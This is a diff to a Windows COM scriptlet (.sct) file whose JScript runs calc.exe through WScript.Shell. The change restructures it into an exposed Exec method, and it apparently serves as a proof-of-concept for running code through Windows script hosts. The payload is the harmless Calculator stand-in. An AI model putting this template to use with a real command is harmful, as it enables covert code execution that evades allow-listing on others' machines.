@@ -1,12 +1,16 @@
 <?XML version="1.0"?>
 <scriptlet>
-<registration
-  progid="TESTING"
-  classid="{A1112221-0000-0000-3000-000DA00DABFC}" >
-  <script language="JScript">
-    <![CDATA[
-      var foo = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
-    ]]>
+<registration description="Desc" progid="Progid" version="0" classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"></registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+
+<script language="JScript">
+<![CDATA[
+	function Exec()	{
+		var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	}
+]]>
 </script>
-</registration>
 </scriptlet>
